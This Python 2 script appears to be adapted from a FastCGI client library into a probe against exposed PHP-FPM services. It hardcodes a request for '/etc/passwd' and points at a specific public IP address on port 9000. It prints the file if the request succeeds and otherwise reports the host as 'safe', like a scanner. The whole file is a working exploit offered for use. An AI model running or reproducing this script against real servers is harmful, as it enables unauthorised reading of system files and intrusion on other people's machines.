#!/usr/bin/env python
"""
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Authors:
    * Based on code by Vladimir Rusinov <vladimir@greenmice.info>
    * Arjen Verstoep <terr@terr.nl>

Original copyright notice:
Copyright (c) 2011 Vladimir Rusinov <vladimir@greenmice.info>
"""

from Bin.lib.fastcgi import flup_fcgi_client as fcgi_client


class FPM(object):
    def __init__(self, host='127.0.0.1', port=9000, sock=None, document_root='/var/www'):
	if sock:
            # Connect to a Unix socket, but keep using use host and port as environment
            # variables
	    self.fcgi_sock = sock

        self.fcgi_host = host
        self.fcgi_port = port

        if document_root[-1:] != '/':
            document_root += '/'
        self.document_root = document_root

    def load_url(self, url, content='', remote_addr='127.0.0.1', cookies=None):
        """Loads URL via FastCGI interface.

        :param url: URL to access, can optionally include a (GET) query string
        :param content: Content to submit with request (i.e. POST data)
        :param remote_addr: IP address of remote end to pass to script
        :param cookies: String with cookies in 'a=b;' format
        :rtype: Tuple: status header, headers, output, error message
        """
	if hasattr(self, 'fcgi_sock'):
		fcgi = fcgi_client.FCGIApp(connect=self.fcgi_sock)
	else:
		fcgi = fcgi_client.FCGIApp(host = self.fcgi_host,
					   port = self.fcgi_port)

        try:
            script_name, query_string = url.split('?')
        except ValueError:
            script_name = url
            query_string = ''

        env = {
            'SCRIPT_FILENAME': '%s%s' % (self.document_root, '/etc/passwd'),
            #'SCRIPT_FILENAME': '%s%s' % ('/', '/etc/passwd'),
            'QUERY_STRING': query_string,
            'REQUEST_METHOD': 'GET' if not content else 'POST',
            'SCRIPT_NAME': script_name,
            'REQUEST_URI': url,
            'GATEWAY_INTERFACE': 'CGI/1.1',
            'SERVER_SOFTWARE': 'zomg',
            'REDIRECT_STATUS': '200',
            'CONTENT_TYPE': 'application/x-www-form-urlencoded',
            # This number below needs to be the number of bytes in the
            # content (POST data)
            'CONTENT_LENGTH': str(len(content)),
            #'DOCUMENT_URI': url,
            'DOCUMENT_ROOT': self.document_root,
            #'SERVER_PROTOCOL' : ???
            'REMOTE_ADDR': remote_addr,
            'REMOTE_PORT': '0',
            'SERVER_ADDR': self.fcgi_host,
            'SERVER_PORT': str(self.fcgi_port),
            'SERVER_NAME': self.fcgi_host,
        }

        if cookies:
            env['HTTP_COOKIE'] = cookies

        ret = fcgi(env, content)
        return ret


if __name__ == '__main__':
    ip = '211.151.142.111'
    try:
        phpfpm = FPM(
            host='211.151.142.111',
            port=9000,
            document_root='/'
        )

        post_string = 'title=Hello&body=World!'

        status_header, headers, output, error_message = phpfpm.load_url(
            url='/index.php?a=b',
            content=post_string,
            remote_addr='127.0.0.1',
            cookies='c=d;e=f;'
        )
        print output
    except:
        print 'ip:%s safe' % ip
